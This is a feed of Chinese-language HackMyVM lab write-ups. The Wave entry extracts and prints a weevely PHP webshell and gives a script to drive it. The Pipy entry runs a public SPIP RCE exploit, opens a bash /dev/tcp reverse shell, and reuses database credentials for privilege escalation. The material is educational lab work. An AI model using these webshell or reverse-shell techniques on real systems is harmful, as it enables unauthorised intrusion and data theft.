[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7656
[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INF] Templates clustered: 1698 (Reduced 1598 Requests)
[INF] Using Interactsh Server: oast.fun
[waf-detect:apachegeneric] [http] [info] http://192.168.205.148
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[ssh-password-auth] [javascript] [info] 192.168.205.148:22
[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ['['publickey','password']']
[openssh-detect] [tcp] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[options-method] [http] [info] http://192.168.205.148 ['HEAD,GET,POST,OPTIONS']
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
[apache-detect] [http] [info] http://192.168.205.148 ['Apache/2.4.62 (Debian)']

```

无果，拷一份网站下来，还是没有东西。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nyx_APex.html</guid><pubDate>Fri, 27 Jun 2025 09:33:45 +0000</pubDate></item><item><title>Kali Linux 拯救计划：修复窗口无法移动及控制按钮消失问题</title><link>https://7r1UMPHK.github.io/post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html</link><description>## 问题场景

在使用 Kali Linux (通常是 XFCE 桌面环境) 时，可能会遇到一个令人困惑的问题：在登录系统后，应用程序窗口（如终端）突然失去了其标题栏，这意味着右上角的最小化、最大化、关闭按钮消失了，并且无法通过鼠标拖动来移动窗口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html</guid><pubDate>Fri, 27 Jun 2025 09:33:43 +0000</pubDate></item><item><title>hmv_Wave</title><link>https://7r1UMPHK.github.io/post/hmv_Wave.html</link><description># hmv_Wave

# 0.简介

**靶机**：[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
**难度**：黄色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5555/tcp open  freeciv
MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```

去80看看web页面

# 2.踩点

![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)

爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck
200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck
200      GET        2l        1w        4c http://192.168.205.138/backup/log.log
200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck
200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck
200      GET        3l        6w       31c http://192.168.205.138/
301      GET        7l       11w      169c http://192.168.205.138/backup =&gt; http://192.168.205.138/backup/
200      GET        3l        6w       31c http://192.168.205.138/index.html
200      GET        1l        2w       18c http://192.168.205.138/robots.txt
200      GET        1l        2w       11c http://192.168.205.138/phptest.php
[####################] - 48s   311445/311445  0s      found:10      errors:0    
[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ 
[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ =&gt; Directory listing (add --scan-dir-listings to scan)                           
```

探索一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/phptest.bck
&lt;?php
print ('HELLO WORLD');
?&gt;
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/index.bck  
&lt;h1&gt; WAVE &lt;/h1&gt;

&lt;!-- wAvE --&gt;
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/log.log  
OK

                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/robots.bck
Disallow: /backup
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/weevely.bck
Warning: Binary output can mess up your terminal. Use '--output -' to tell curl to output it to your terminal anyway, or consider 
Warning: '--output &lt;FILE&gt;' to save to a file.
```

找到了一个文件，我们下载下来看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
                                                                                                                                
┌──(kali㉿kali)-[~/test]
└─$ cd tmp                                                      
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat weevely.bck                
&lt;?php include '\160\x68\141\x72\72\57\57'.basename(__FILE__).'\57\x78';__HALT_COMPILER(); ?&gt;/x�X���U��j�0ſ�)J�hB�S;���
                                                                                                                      �/�J��▒m�.��)��n�(▒��'`�=6�&amp;T�YE�p��(�q1���a'H�Pq6�.���v���/��8�ĳe��$+��s�'����5�|��H�� O����w�2%��OyTV���Q�b�A���h��=�W {��
�kЛw8�a����S�����
�fBLXx  ���Ϝ����v����m���%#,H��R#2HJ]�t�|*��������h�Ms��
                       ږ&amp;'��Y���P��B��lXw�l�e���E!S�He�2�p�7G�[N��=�-��Ƀ�i�)�[��N����7��U_�=*��Ψ�s?c((VGBMB                                                                                                                                

```

部分内容显示乱码，但是我们通过可读的可以得知，可能是一个恶意后门，我们尝试恢复一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ file weevely.bck
weevely.bck: PHP phar archive with SHA1 signature
                                                                                                                                
┌──(kali㉿kali)-[~/test/tmp]
└─$ phar extract -f weevely.bck weevely.phpr
//home/kali/test/tmp/weevely.bck/x ...ok
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
&lt;?php eval('$k='3ddf0d5c';$kh='b6e7a529b6c2';$kf='d598a771749b';$p='afnqDsRcBpVmU71y';

function x($t,$k){
$c=strlen($k);$l=strlen($t);$o='';
for($i=0;$i&lt;$l;){
for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)
{
$o.=$t[$i]^$k[$j];
}
}
return $o;
}
if (@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print('$p$kh$r$kf');
}');                                                                                                                                
```

确实是**Webshell 后门**，我们尝试利用一下

```bash
┌──(kali㉿kali)-[~/…/kali/test/tmp/weevely.bck]
└─$ cat tool.php 
&lt;?php
$k = '3ddf0d5c';  // 密钥

function x($t, $k)
{
    $c = strlen($k);  // 密钥长度
    $l = strlen($t);  // 文本长度
    $o = '';

    // XOR 加密/解密
    for ($i = 0; $i &lt; $l;)
    {
        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++)
        {
            $o .= chr(ord($t[$i]) ^ ord($k[$j]));
        }
    }
    return $o;
}

echo '选择操作：\n';
echo '1. 加密\n';
echo '2. 解密\n';
$choice = trim(fgets(STDIN));  // 获取用户输入

echo '请输入文本：\n';
$input_text = trim(fgets(STDIN));  // 获取要加密/解密的文本

if ($choice == 1) {
    // 加密
    echo '加密前的文本: ' . $input_text . '\n';

    // 压缩文本
    $compressed_text = gzcompress($input_text);  // 压缩文本
    $encrypted_text = x($compressed_text, $k);   // XOR 加密
    echo '加密后的文本: ' . base64_encode($encrypted_text) . '\n';  // 输出 Base64 编码后的加密文本
} elseif ($choice == 2) {
    // 解密
    $decoded_text = base64_decode($input_text);  // Base64 解码
    $decrypted_text = x($decoded_text, $k);      // XOR 解密
  
    // 解压缩
    $decompressed = @gzuncompress($decrypted_text);  // 解压缩，使用 @ 避免警告
  
    // 如果解压成功，则输出解压后的内容；否则输出解密后的内容
    if ($decompressed !== false) {
        echo '解密并解压后的文本: ' . $decompressed . '\n';
    } else {
        echo '解密后的文本: ' . $decrypted_text . '\n';
    }
} else {
    echo '无效的选项\n';
}
?&gt;
```

加密和解密模块（解密模块是乱码，建议不用，或者自己改）。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Wave.html</guid><pubDate>Fri, 27 Jun 2025 09:33:39 +0000</pubDate></item><item><title>hmv_qweasd</title><link>https://7r1UMPHK.github.io/post/hmv_qweasd.html</link><description># hmv_qweasd

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Qweasd
**难度**：黄色
**目标 IP**：192.168.205.217
**本机** IP：192.168.205.141

---

## **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
Nmap scan report for 192.168.205.217
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Jetty 10.0.18
MAC Address: 08:00:27:75:04:B0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
                                                                 
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_qweasd.html</guid><pubDate>Fri, 27 Jun 2025 09:33:36 +0000</pubDate></item><item><title>hmv_publisher</title><link>https://7r1UMPHK.github.io/post/hmv_publisher.html</link><description># hmv_publisher

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
**难度**：绿色
**目标 IP**：192.168.205.211
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口，命令如下：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
Nmap scan report for 192.168.205.211
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_publisher.html</guid><pubDate>Fri, 27 Jun 2025 09:33:34 +0000</pubDate></item><item><title>hmv_Principle2</title><link>https://7r1UMPHK.github.io/post/hmv_Principle2.html</link><description># hmv_Principle2

# 0.简介

**靶机**：[hackmyvm - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
**难度**：黄色
**目标 IP**：192.168.205.247
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
Host is up (0.00075s latency).
Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
35659/tcp open  unknown
42607/tcp open  unknown
43239/tcp open  unknown
43401/tcp open  unknown
46365/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
                                                                   
```

其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子

---

# 2.踩点

## prot 445

ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.247/public
Password for [WORKGROUP\kali]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Nov 28 19:57:45 2023
  ..                                  D        0  Sun Nov 26 00:19:40 2023
  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023

                19962704 blocks of size 1024. 17182940 blocks available
smb: \&gt; get new_era.txt
getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
smb: \&gt; get straton.txt
getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
smb: \&gt; get loyalty.txt
getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
smb: \&gt; exit
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat new_era.txt                   
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat straton.txt
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat loyalty.txt
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
                                                                                                                                     

# new_era.txt翻译
昨天发生了重大变化，新政府，新市长。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Principle2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:31 +0000</pubDate></item><item><title>hmv_Pipy</title><link>https://7r1UMPHK.github.io/post/hmv_Pipy.html</link><description># hmv_Pipy

# 0.简介

**靶机**：[hackmyvm - Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST
Nmap scan report for tiny.hmv (192.168.205.143)
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:47:C9:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

先看**80端口**，**22端口**候补

# 2.踩点

![Image](https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62)

扫描有没有漏洞（不得不说，群里面的web大佬**Anjv-W.**  推荐的扫洞工具就是好用，点赞👍）

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.143               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.online
[CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&amp;lang=fr
[waf-detect:apachegeneric] [http] [info] http://192.168.205.143
[openssh-detect] [tcp] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
[ssh-password-auth] [javascript] [info] 192.168.205.143:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ['['publickey','password']']
[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ['Vulnerable to Terrapin']
[composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json
[composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json
[metatag-cms] [http] [info] http://192.168.205.143 ['SPIP 4.2.0']
[readme-md] [http] [info] http://192.168.205.143/README.md
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.143
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143
[apache-detect] [http] [info] http://192.168.205.143 ['Apache/2.4.52 (Ubuntu)']
[spip-detect:spip_version] [http] [info] http://192.168.205.143 ['4.2.0']
[configuration-listing] [http] [medium] http://192.168.205.143/config/
```

有一个[CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517)漏洞，我们利用一下

![Image](https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12)

非授权远程执行更喜欢了🤩

```bash
git clone https://github.com/Chocapikk/CVE-2024-8517.git
cd CVE-2024-8517
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt 
┌──(env)─(kali㉿kali)-[~/test/tmp/CVE-2024-8517]
└─$ python3 exploit.py -u http://192.168.205.143          
✅ Target is vulnerable! Command Output: www-data
                                                                                                                                     
ℹ  Interactive shell started. Type `exit` to quit.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

deactivate #退出虚拟环境命令
rm -rf env #删除虚拟环境
```

成功，但是我们要弹个**反弹shell**回去，因为它这个脚本的shell有限制

```bash
$ bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@pipy:/var/www/html$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@pipy:/var/www/html$ ls -la
total 156
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 .
drwxr-xr-x  4 www-data www-data  4096 Oct  5  2023 ..
-rw-r--r--  1 www-data www-data  7045 Feb 23  2023 CHANGELOG.md
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 IMG
-rw-r--r--  1 www-data www-data 35147 Feb 23  2023 LICENSE
-rw-r--r--  1 www-data www-data   842 Feb 23  2023 README.md
-rw-r--r--  1 www-data www-data   178 Feb 23  2023 SECURITY.md
-rw-r--r--  1 www-data www-data  1761 Feb 23  2023 composer.json
-rw-r--r--  1 www-data www-data 27346 Feb 23  2023 composer.lock
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 config
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 ecrire
-rw-r--r--  1 www-data www-data  4307 Feb 23  2023 htaccess.txt
-rw-r--r--  1 www-data www-data    42 Feb 23  2023 index.php
drwxr-xr-x  5 www-data www-data  4096 Oct  3  2023 local
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 plugins-dist
-rw-r--r--  1 www-data www-data  3645 Feb 23  2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data  4096 Oct  3  2023 prive
-rw-r--r--  1 www-data www-data   973 Feb 23  2023 spip.php
-rw-r--r--  1 www-data www-data  1212 Feb 23  2023 spip.png
-rw-r--r--  1 www-data www-data  1673 Feb 23  2023 spip.svg
drwxr-xr-x 10 www-data www-data  4096 Oct  3  2023 squelettes-dist
drwxr-xr-x  5 www-data www-data  4096 Jan 18 02:35 tmp
drwxr-xr-x  6 www-data www-data  4096 Oct  3  2023 vendor
www-data@pipy:/var/www/html$ cd config/
www-data@pipy:/var/www/html/config$ ls -al
total 48
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess
-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok
-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php
-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php
-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php
-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
www-data@pipy:/var/www/html/config$ cat connect.php
&lt;?php
if (!defined('_ECRIRE_INC_VERSION')) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
www-data@pipy:/var/www/html/config$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 503
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; use spip;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [spip]&gt; show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)

MariaDB [spip]&gt; select * from spip_auteurs\G
*************************** 1. row ***************************
   id_auteur: 1
         nom: Angela
         bio: 
       email: angela@pipy.htb
    nom_site: 
    url_site: 
       login: angela
        pass: 4ng3l4
     low_sec: 
      statut: 0minirezo
   webmestre: oui
         maj: 2023-10-04 17:28:39
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 13:50:34
 alea_actuel: 387046876651c39a45bc836.13502903
  alea_futur: 465278670651d6da4349d85.01841245
       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
cookie_oubli: NULL
      source: spip
        lang: 
    imessage: 
 backup_cles: 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM=
*************************** 2. row ***************************
   id_auteur: 2
         nom: admin
         bio: 
       email: admin@pipy.htb
    nom_site: 
    url_site: 
       login: admin
        pass: $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2
     low_sec: 
      statut: 1comite
   webmestre: non
         maj: 2023-10-04 17:31:03
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 17:31:03
 alea_actuel: 1540227024651d7e881c21a5.84797952
  alea_futur: 439334464651da1526dbb90.67439545
       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=
      source: spip
        lang: fr
    imessage: oui
 backup_cles: 
2 rows in set (0.000 sec)
```

切换至`angela`

```bash
www-data@pipy:/var/www/html/config$ su - angela
Password: 
angela@pipy:~$ id
